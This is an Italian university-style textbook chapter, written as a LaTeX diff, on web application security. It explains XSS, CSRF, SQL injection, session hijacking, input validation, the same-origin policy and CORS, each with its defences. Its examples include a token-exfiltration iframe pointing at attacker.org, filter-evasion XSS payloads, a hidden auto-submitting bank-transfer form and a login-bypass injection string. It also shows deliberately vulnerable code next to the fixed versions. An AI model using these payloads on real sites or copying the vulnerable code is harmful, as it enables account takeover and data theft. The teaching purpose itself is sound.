@@ -1,0 +1,549 @@
+\chapter{Sicurezza delle applicazioni web}
+
+Le applicazioni web hanno un ruolo cruciale nel business e nella comunicazione
+moderni: proteggerle è essenziale per prevenire accessi non autorizzati,
+violazioni di dati e altre attività malevole.
+
+\dfn{Sicurezza delle applicazioni web}{
+  L'insieme delle misure e delle pratiche adottate per proteggere le
+  applicazioni web dalle minacce. L'obiettivo è garantire
+  \term{riservatezza}, \term{integrità} e \term{disponibilità} sia
+  dell'applicazione sia dei dati che tratta.}
+
+\section{Due livelli di sicurezza}
+
+\begin{center}
+\renewcommand{\arraystretch}{1.4}
+\begin{tabular}{@{}>{\raggedright\arraybackslash}p{6.3cm}@{\hspace{1.0cm}}>{\raggedright\arraybackslash}p{6.3cm}@{}}
+  \textbf{Livello di rete} & \textbf{Livello applicativo} \\
+  Riguarda la comunicazione fra l'applicazione e Internet.
+  & Riguarda le misure implementate \textbf{dentro} l'applicazione. \\
+  Cifratura dei dati (HTTPS), firewall che filtrano richieste malevole,
+  monitoraggio e log per individuare schemi sospetti.
+  & Autenticazione e autorizzazione, validazione degli input, gestione delle
+    sessioni, riservatezza dei dati. \\
+  Protegge da attacchi al livello di rete (\textit{sniffing}, \textit{man in
+  the middle}).
+  & Gli attacchi possono essere \textbf{nascosti dentro richieste HTTP
+    perfettamente valide} e sfruttare vulnerabilità nel modo in cui
+    l'applicazione è scritta. \\
+\end{tabular}
+\end{center}
+
+La sicurezza a livello di rete è argomento dei corsi di reti; qui ci occupiamo
+di \textbf{sicurezza a livello applicativo}, cioè di come progettare e
+sviluppare applicazioni che non contengano vulnerabilità. Esamineremo anche i
+meccanismi di sicurezza dei browser moderni, per sapere come lavorarci
+insieme.
+
+\info{Quanto è grave la situazione}{
+  Piuttosto grave: una quota significativa delle applicazioni web è affetta da
+  almeno una vulnerabilità. L'\term{OWASP} (\textit{Open Worldwide Application
+  Security Project}) è un'organizzazione senza scopo di lucro che raccoglie dati
+  sulle vulnerabilità e pubblica periodicamente la classifica delle classi più
+  diffuse, la \textbf{OWASP Top 10}.}
+
+In questo capitolo vediamo un sottoinsieme di vulnerabilità che ricorrono di
+frequente, possono causare danni molto seri e possono essere prevenute con
+relativa facilità: \term{Cross-site Scripting}, \term{Cross-site Request
+Forgery}, \term{SQL injection}, \term{session hijacking} e validazione
+insufficiente degli input.
+
+\section{Cross-site Scripting}
+
+\dfn{Cross-site Scripting (XSS)}{
+  Gli attacchi \term{XSS} mirano a \textbf{iniettare codice lato client
+  malevolo} in siti altrimenti affidabili. L'attaccante sfrutta difetti
+  dell'applicazione per far arrivare il proprio codice ad altri utenti.}
+
+I difetti che rendono possibili questi attacchi si verificano quando
+un'applicazione \textbf{mostra input non affidabile} (per esempio proveniente
+dagli utenti) \textbf{senza validazione né escaping}.
+
+\subsection{Conseguenze}
+
+Il codice iniettato viene eseguito dal browser \textbf{come se fosse codice
+fidato}: è indistinguibile dal JavaScript legittimo della pagina. Gli utenti
+possono essere attaccati semplicemente facendo clic su un collegamento
+malevolo.
+
+Può fare tutto quello che può fare il JavaScript fidato:
+
+\begin{itemize}
+  \item accedere ai cookie e manipolarli, compresi gli identificatori di
+        sessione;
+  \item accedere a \code{localStorage} e \code{sessionStorage}, quindi a token
+        e dati riservati;
+  \item manipolare la pagina: alterare collegamenti, form, aggiungere contenuti;
+  \item compiere azioni: generare clic, inviare form al posto dell'utente.
+\end{itemize}
+
+\begin{esempio}{Esfiltrare un token}
+Accedere al token o al cookie di sessione è solo metà del lavoro: l'attaccante
+deve anche farlo uscire dal browser della vittima. Ci sono vari modi:
+reindirizzare la finestra (o un \code{iframe}) a una URL malevola, aggiungere
+un'immagine la cui sorgente è una URL malevola, caricare un foglio di stile con
+\attr{href} malevolo.
+
+\begin{lstlisting}[style=html]
+<iframe src="javascript:window.location.href =
+  `https://attacker.org?token=${localStorage.getItem('token')}`">
+</iframe>
+\end{lstlisting}
+\end{esempio}
+
+\subsection{Perché filtrare non basta}
+
+Un primo istinto è applicare \textbf{filtri} sui dati in ingresso: rimuovere le
+occorrenze di \code{<script>} e \code{</script>}, o rimuovere qualunque
+\code{<} e \code{>}. Sembra ragionevole?
+
+Purtroppo i \textit{payload} XSS possono essere molto più subdoli, ed esistono
+tecniche dedicate di \textbf{evasione dei filtri}. Esistono molti altri modi di
+iniettare codice JavaScript:
+
+\begin{lstlisting}[style=html, name=evasione.html]
+<iframe src="javascript:alert('XSS')">
+<iframe src="jav	ascript:alert('XSS')">        <!-- carattere di tabulazione -->
+<iframe src="jav&#x09;ascript:alert('XSS')">  <!-- tabulazione codificata -->
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115...">
+\end{lstlisting}
+
+OWASP pubblica un intero \textit{cheatsheet} di tecniche di evasione dei filtri.
+
+\error{Le liste nere non funzionano}{
+  Elencare ciò che è pericoloso è una battaglia persa: basta un caso non
+  previsto e la difesa cade. La strada corretta è l'opposto: assumere che tutto
+  sia pericoloso e \textbf{codificare} l'input in modo che non possa mai essere
+  interpretato come codice.}
+
+\subsection{La soluzione: escaping}
+
+Il modo corretto di affrontare il problema è \textbf{fare l'escaping}
+(sanitizzare) degli input quando li si inserisce nelle pagine, convertendo i
+caratteri pericolosi (\code{<}, \code{>}, \code{"}, \code{'}) in innocue entità
+HTML --- esattamente quelle studiate nel capitolo 2.
+
+\begin{center}
+  \code{<script>alert("XSS")</script>} \\[3pt]
+  $\downarrow$ \\[3pt]
+  \code{\&lt;script\&gt;alert(\&quot;XSS\&quot;)\&lt;/script\&gt;}
+\end{center}
+
+Soluzioni dedicate esistono nella maggior parte dei framework e dei linguaggi, e
+si possono usare librerie apposite (per esempio \code{sanitize} per Node.js).
+
+\subsection{Il modello di sicurezza di Angular}
+
+Angular \textbf{sanitizza automaticamente} tutti i dati non fidati legati o
+interpolati in un template. Per impostazione predefinita, \textbf{tutti} i dati
+sono considerati non fidati.
+
+Si possono marcare esplicitamente alcuni dati come fidati usando il
+\code{DomSanitizer}, che offre metodi come
+\code{bypassSecurityTrustHtml(value: string): SafeHtml}. Questi metodi
+aggirano i meccanismi di sicurezza predefiniti in contesti specifici, e vanno
+ovviamente usati con estrema cautela.
+
+\begin{lstlisting}[style=ts, name=correzione.ts]
+filterTable() {
+  let queryParam: string = this.route.snapshot.queryParams.q;
+  if (queryParam) {
+    queryParam = queryParam.trim();
+    this.dataSource.filter = queryParam.toLowerCase();
+-   this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
++   this.searchValue = queryParam
+  }
+}
+\end{lstlisting}
+
+La vulnerabilità stava proprio nella chiamata a \code{bypassSecurityTrustHtml}
+su un dato che veniva dalla query string: rimuoverla ripristina la sanitizzazione
+automatica.
+
+\section{Cross-site Request Forgery}
+
+\dfn{CSRF}{
+  Gli attacchi \term{Cross-site Request Forgery} (CSRF o XSRF) mirano a
+  \textbf{costringere un utente finale a compiere azioni indesiderate} su
+  un'applicazione web sulla quale è \textbf{attualmente autenticato}.}
+
+Le azioni indesiderate possono essere operazioni che cambiano lo stato:
+trasferire fondi, cambiare l'indirizzo e-mail associato a un account. Se la
+vittima ha privilegi amministrativi, l'attacco può compromettere l'intera
+applicazione.
+
+\begin{figure}[H]
+  \centering
+  \begin{tikzpicture}[font=\Lato\small,
+      hdr/.style={wtnode, minimum width=2.9cm, minimum height=0.9cm},
+      life/.style={draw=neutral!45!white, line width=0.7pt, dashed},
+      msg/.style={-{Stealth[length=6pt,width=5pt]}, line width=0.9pt,
+                  draw=primary!70!black},
+      bad/.style={-{Stealth[length=6pt,width=5pt]}, line width=0.9pt,
+                  draw=red-gradient-6},
+      ml/.style={font=\FiraCodeNL\scriptsize, midway, above, inner sep=2.5pt,
+                 fill=white, text=neutral!15!black}]
+
+    \def\xv{0} \def\xm{5.0} \def\xb{10.2}
+
+    \node[hdr] (V) at (\xv,0) {\textbf{Vittima}};
+    \node[hdr, draw=red-gradient-6, fill=red-gradient-1!30!white]
+      (M) at (\xm,0) {\textbf{Sito malevolo}};
+    \node[hdr] (B) at (\xb,0) {\textbf{Banca}};
+
+    \draw[life] (V.south) -- (\xv,-4.2);
+    \draw[life] (M.south) -- (\xm,-4.2);
+    \draw[life] (B.south) -- (\xb,-4.2);
+
+    \draw[msg] (\xv,-0.9) -- (\xb,-0.9) node[ml]{POST /login usr\&pwd};
+    \draw[msg] (\xb,-1.6) -- (\xv,-1.6) node[ml]{200 OK Set-Cookie: auth=xYs...};
+    \draw[bad] (\xv,-2.4) -- (\xm,-2.4) node[ml]{clic su un link malevolo};
+    \draw[bad] (\xm,-3.1) -- (\xv,-3.1) node[ml]{pagina con form nascosto};
+    \draw[bad] (\xv,-3.9) -- (\xb,-3.9)
+      node[ml]{POST /transfer + Cookie: auth=xYs...};
+  \end{tikzpicture}
+  \caption{La dinamica di un attacco CSRF.}
+  \label{fig:csrf}
+\end{figure}
+
+Il punto cruciale è l'ultimo passo: il browser della vittima vede che la
+richiesta è diretta all'applicazione legittima e \textbf{allega
+automaticamente il cookie di autenticazione}, come farebbe per qualunque altra
+richiesta verso quel dominio.
+
+\begin{esempio}{Una pagina di attacco}
+\begin{lstlisting}[style=html, name=pagina-malevola.html]
+<!DOCTYPE html>
+<html lang="it">
+  <head>
+    <title>Pagina assolutamente non malevola!</title>
+  </head>
+  <body>
+    <h1>Ops, questo sito e' momentaneamente non disponibile.</h1>
+
+    <form style="display:none;" method="POST"
+          action="https://bank.com/transfer">
+      <input type="text"   name="to"     value="EvilZampurian">
+      <input type="number" name="amount" value="999.99">
+      <input type="submit" id="submit"   value="submit">
+    </form>
+
+    <script>
+      document.getElementById("submit").click();
+    </script>
+  </body>
+</html>
+\end{lstlisting}
+
+Il form è invisibile (\code{display:none}) e viene inviato automaticamente da
+uno script: l'utente vede solo un messaggio di errore innocuo.
+\end{esempio}
+
+\subsection{Mitigazione: il token sincronizzatore}
+
+Il modo migliore di mitigare le vulnerabilità CSRF è un approccio basato su
+token, detto \term{synchronizer token pattern}:
+
+\begin{enumerate}
+  \item l'applicazione genera un \textbf{token CSRF} specifico per la sessione e
+        lo salva nella sessione;
+  \item il token viene incluso in un \textbf{campo nascosto} nei form sensibili;
+  \item all'invio, il token viene ritrasmesso all'applicazione;
+  \item l'applicazione verifica che il token ricevuto sia lo \textbf{stesso}
+        che aveva generato e salvato nella sessione corrente.
+\end{enumerate}
+
+Un attaccante non può indovinare il token --- \textbf{a patto} che non esistano
+vulnerabilità XSS (che permetterebbero di leggerlo) e che i token non siano
+prevedibili.
+
+\begin{lstlisting}[style=html, name=transfer.html]
+<form method="POST" action="/transfer">
+  <input type="text"   name="to"     value="">
+  <input type="number" name="amount" value="">
+  <input type="hidden" name="csrf"   value="x5e1EUR">
+  <input type="submit" value="submit">
+</form>
+\end{lstlisting}
+
+\info{Usare quello che il framework offre}{
+  La maggior parte dei framework include già contromisure CSRF: per Express
+  esistono middleware come \code{tiny-csrf}, Angular include contromisure
+  proprie, Spring protegge i metodi \code{POST} per impostazione predefinita con
+  un meccanismo a token. Se sono disponibili, va letta la documentazione e vanno
+  usate correttamente; se non lo sono, la protezione va comunque implementata per
+  le operazioni sensibili.}
+
+\section{SQL injection}
+
+\dfn{SQL injection}{
+  Le \term{SQL injection} consistono nell'iniettare codice malevolo, proveniente
+  da input utente non sanitizzati, dentro le interrogazioni al database.}
+
+Il nome non deve trarre in inganno: anche le interrogazioni ai database NoSQL
+possono essere altrettanto vulnerabili.
+
+Questi attacchi possono portare alla fuga di dati riservati, alla modifica dei
+dati, alla violazione dei controlli di accesso e, in alcuni casi, persino
+all'esecuzione di codice arbitrario sul server del database.
+
+\begin{esempio}{Una login vulnerabile}
+\begin{lstlisting}[style=ts, name=login-vulnerabile.ts]
+models.sequelize.query(`
+  SELECT * FROM Users
+  WHERE email = '${req.body.email || ''}'
+    AND password = '${security.hash(req.body.password || '')}'
+    AND deletedAt IS NULL`, { model: UserModel, plain: true })
+  .then((authenticatedUser: { data: User }) => {
+    /* utente trovato, gestisci l'autenticazione */
+  }).catch(err => {
+    next(err);
+  });
+\end{lstlisting}
+
+I parametri della richiesta sono inseriti \textbf{direttamente} nella query.
+Normalmente funziona:
+
+\begin{lstlisting}[style=sql]
+SELECT * FROM Users
+WHERE email = 'luigi@webtech-sh.op'
+  AND password = 'webtechs!'
+  AND deletedAt IS NULL
+\end{lstlisting}
+
+Ma non possiamo fidarci dell'input dell'utente. Che cosa succede se
+l'attaccante inserisce come e-mail la stringa
+\code{luigi@webtech-sh.op'-{}-}?
+
+\begin{lstlisting}[style=sql]
+SELECT * FROM Users
+WHERE email = 'luigi@webtech-sh.op'-- AND
+  password = 'dontknowthislol' AND
+  deletedAt IS NULL
+\end{lstlisting}
+
+In SQL \code{-{}-} inizia un commento su riga singola: tutto il controllo sulla
+password sparisce, e l'attaccante entra come \code{luigi} senza conoscerne la
+password.
+\end{esempio}
+
+\subsection{Prevenzione}
+
+La difesa è usare \textbf{prepared statement con query parametriche} (o
+\textit{stored procedure}): i parametri vengono trasmessi al database
+\textbf{separatamente} dal testo della query, quindi non possono in alcun modo
+alterarne la struttura.
+
+\begin{lstlisting}[style=ts, name=login-sicura.ts]
+models.sequelize.query(`
+  SELECT * FROM Users
+  WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
+  {
+    bind: [req.body.email, security.hash(req.body.password)],
+    model: models.User,
+    plain: true
+  })
+  .then((authenticatedUser: { data: User }) => {
+    /* utente trovato, gestisci l'autenticazione */
+  }).catch(err => {
+    next(err);
+  });
+\end{lstlisting}
+
+\info{Un altro motivo per usare un ORM}{
+  Usando i metodi di un ORM come Sequelize (\code{findOne}, \code{findAll} con
+  la clausola \code{where}) la parametrizzazione avviene automaticamente. Le
+  \textit{query} scritte a mano concatenando stringhe sono l'eccezione, e sono
+  proprio lì che si annidano queste vulnerabilità.}
+
+\section{Session hijacking}
+
+Sono attacchi che mirano a \textbf{compromettere il token di sessione},
+tipicamente rubandone uno valido oppure indovinandolo. Tre scenari tipici:
+
+\begin{center}
+\renewcommand{\arraystretch}{1.4}
+\begin{tabular}{@{}>{\raggedright\arraybackslash}p{4.1cm}@{\hspace{0.7cm}}>{\raggedright\arraybackslash}p{8.4cm}@{}}
+  \textbf{Scenario} & \textbf{Difesa} \\
+  Canale di comunicazione vulnerabile: l'attaccante intercetta il traffico e
+  legge il token.
+  & Usare \textbf{HTTPS}: senza cifratura il token viaggia in chiaro. \\
+  Applicazione vulnerabile a XSS: l'attaccante legge il token da JavaScript.
+  & Eliminare le vulnerabilità XSS; marcare i cookie di sessione come
+    \code{HttpOnly}, così che JavaScript non possa leggerli. \\
+  Token di sessione \textbf{prevedibile}: l'attaccante lo indovina.
+  & Generare identificatori lunghi e crittograficamente casuali. \\
+\end{tabular}
+\end{center}
+
+\section{Validazione degli input}
+
+Una validazione corretta degli input è gran parte del lavoro per garantire
+l'integrità dei dati in un'applicazione web.
+
+La validazione \textbf{lato client} è un'ottima pratica di usabilità: gli errori
+vengono presentati all'utente il prima possibile. Può però essere
+\textbf{completamente aggirata} da un attaccante, che ha accesso al codice lato
+client e può manipolarlo, o che può generare richieste HTTP direttamente.
+
+\error{La validazione deve sempre esserci anche sul server}{
+  Tutto ciò che gira nel browser è sotto il controllo dell'utente. I controlli
+  lato client servono all'utente onesto, non contro l'attaccante.}
+
+\begin{esempio}{Aggirare la validazione con i DevTools}
+Nell'applicazione dimostrativa OWASP Juice Shop i clienti possono lasciare una
+valutazione al negozio, e l'interfaccia garantisce che si possa scegliere solo
+un punteggio da 1 a 5. Si riesce a inserire uno 0?
+
+Ispezionando le richieste di rete nei DevTools si vede che l'invio produce una
+\code{POST} a \code{/api/Feedbacks/} con questo corpo:
+
+\begin{lstlisting}[style=json]
+{
+  "UserId": 2,
+  "captchaId": 1,
+  "captcha": "80",
+  "comment": "Example review (***@webtech-sh.op)",
+  "rating": 3
+}
+\end{lstlisting}
+
+Basta rispedire la richiesta modificata con \code{"rating": 0}, cosa che si può
+fare direttamente dai DevTools con il comando \textit{Resend}. L'interfaccia
+non è mai stata un ostacolo.
+\end{esempio}
+
+\section{I meccanismi di sicurezza del browser}
+
+I browser moderni impongono un modello di sicurezza rigoroso per bloccare
+alcune classi di attacchi. Chi sviluppa per il Web deve conoscere questi
+meccanismi e sapere come lavorarci insieme. Il principale è la \term{Same-origin
+Policy}.
+
+\subsection{Same-origin Policy}
+
+\dfn{Same-origin Policy}{
+  Per impostazione predefinita, un documento o uno script può interagire
+  soltanto con risorse della \textbf{stessa origine}. Stessa origine significa
+  che la URL ha lo stesso \textbf{protocollo}, la stessa \textbf{porta} e lo
+  stesso \textbf{host}.}
+
+Consideriamo il documento all'indirizzo
+\code{http://store.webtech.com/cat/index.html}:
+
+\begin{center}
+\renewcommand{\arraystretch}{1.4}
+\begin{tabular}{@{}l@{\hspace{0.8cm}}c@{\hspace{0.8cm}}l@{}}
+  \textbf{URL} & \textbf{Stessa origine?} & \textbf{Motivo} \\
+  \code{http://store.webtech.com/pages/about.html} & sì  & differisce solo il percorso \\
+  \code{http://store.webtech.com/img/logo.png}     & sì  & differisce solo il percorso \\
+  \code{https://store.webtech.com/page.html}       & no  & protocollo diverso \\
+  \code{http://store.webtech.com:81/dir/page.html} & no  & porta diversa \\
+  \code{http://course.webtech.com/cat/index.html}  & no  & host diverso \\
+\end{tabular}
+\end{center}
+
+La politica si applica in generale a tutti i dati recuperati da codice
+JavaScript tramite \code{fetch()} o \code{XMLHttpRequest}.
+
+\begin{lstlisting}[style=js, name=pagina su localhost:3001]
+function doFetch() {
+  fetch("http://localhost:3000/").then(data => {
+    data.json().then(data => {
+      console.log(data)
+    })
+  }).catch(err => {
+    console.log(err.message)   // bloccata dalla same-origin policy
+  });
+}
+\end{lstlisting}
+
+\subsection{CORS}
+
+A volte abbiamo bisogno di accedere a contenuti di origini diverse --- e in
+effetti lo abbiamo già fatto, nel capitolo sulle API REST.
+
+\dfn{CORS}{
+  Il meccanismo \term{Cross-origin Resource Sharing} permette a un server di
+  \guillemotleft rinunciare\guillemotright\ alla Same-origin Policy e dichiarare che i propri
+  contenuti possono essere letti anche da origini diverse dalla propria.}
+
+CORS è basato sugli \textbf{header}:
+
+\begin{itemize}
+  \item il browser allega un header \code{Origin} alle richieste in uscita;
+  \item il server può includere nella risposta un header
+        \code{Access-Control-Allow-Origin}, il cui valore specifica quali
+        origini sono autorizzate a usare i dati:
+        \code{*} significa qualunque origine, oppure si indica un'origine
+        specifica come \code{http://localhost:3001};
+  \item se l'header non è presente, il valore predefinito è che le richieste
+        cross-origin sono \textbf{vietate};
+  \item il browser verifica che \code{Access-Control-Allow-Origin} corrisponda a
+        \code{Origin}: se sì il codice client può accedere ai dati, altrimenti
+        la richiesta viene bloccata.
+\end{itemize}
+
+\begin{figure}[H]
+  \centering
+  \begin{tikzpicture}[font=\Lato\scriptsize,
+      hdr/.style={wtnode, minimum width=2.6cm, minimum height=0.8cm},
+      msg/.style={-{Stealth[length=5pt,width=4pt]}, line width=0.85pt,
+                  draw=primary!70!black},
+      ml/.style={font=\FiraCodeNL\scriptsize, midway, above, inner sep=2pt,
+                 fill=white, text=neutral!15!black}]
+
+    % bloccato
+    \node[font=\Lato\scriptsize\bfseries, text=red-gradient-6!75!black]
+      at (4.4,1.5) {scenario bloccato};
+    \node[hdr] (c1) at (0,0.75) {localhost:3001};
+    \node[hdr] (s1) at (8.8,0.75) {localhost:3000};
+    \draw[msg] (c1) -- (s1) node[ml]{GET /data \ Origin: http://localhost:3001};
+    \draw[msg, draw=red-gradient-6] (8.8,0.15) -- (0,0.15)
+      node[ml, below]{200 OK \ (nessun header CORS)};
+    \node[font=\Lato\normalsize\bfseries, text=red-gradient-6] at (4.4,-0.3) {X};
+
+    % permesso
+    \node[font=\Lato\scriptsize\bfseries, text=green-gradient-6!60!black]
+      at (4.4,-1.3) {scenario permesso};
+    \node[hdr] (c2) at (0,-2.05) {localhost:3001};
+    \node[hdr] (s2) at (8.8,-2.05) {localhost:3000};
+    \draw[msg] (c2) -- (s2) node[ml]{GET /data \ Origin: http://localhost:3001};
+    \draw[msg, draw=green-gradient-6] (8.8,-2.65) -- (0,-2.65)
+      node[ml, below]{200 OK \ Access-Control-Allow-Origin: *};
+  \end{tikzpicture}
+  \caption{Il meccanismo CORS.}
+  \label{fig:cors}
+\end{figure}
+
+\warning{CORS non protegge il server}{
+  È un fraintendimento comune. CORS è un meccanismo del \textbf{browser}, che
+  protegge l'utente impedendo a una pagina malevola di leggere le risposte di
+  un'altra origine. Non impedisce affatto a un programma qualunque (un client
+  scritto a mano, \code{curl}) di contattare il server. L'autorizzazione va
+  comunque imposta lato server.
+
+  Si noti anche che \code{Access-Control-Allow-Origin: *} --- quello che
+  avevamo scritto nel capitolo 15 con \code{app.use(cors())} --- rende l'API
+  leggibile da qualunque sito: va bene per una API pubblica, non per una che
+  espone dati riservati.}
+
+\section{Riferimenti}
+
+\begin{itemize}
+  \item \textbf{Cross Site Scripting (XSS) Attacks} --- OWASP. \\
+        \urlx{https://owasp.org/www-community/attacks/xss/}
+  \item \textbf{XSS game} --- esercitazione pratica. \\
+        \urlx{https://xss-game.appspot.com/}
+  \item \textbf{Cross Site Request Forgery (CSRF) Attacks} --- OWASP. \\
+        \urlx{https://owasp.org/www-community/attacks/csrf}
+  \item \textbf{SQL Injection Attacks} --- OWASP. \\
+        \urlx{https://owasp.org/www-community/attacks/SQL_Injection}
+  \item \textbf{Same-origin Policy} --- MDN web docs. \\
+        \urlx{https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy}
+  \item \textbf{Cross-Origin Resource Sharing (CORS)} --- MDN web docs. \\
+        \urlx{https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS}
+  \item \textbf{Web Application Security Guide} --- Wikibooks. \\
+        \urlx{https://en.wikibooks.org/wiki/Web_Application_Security_Guide}
+\end{itemize}
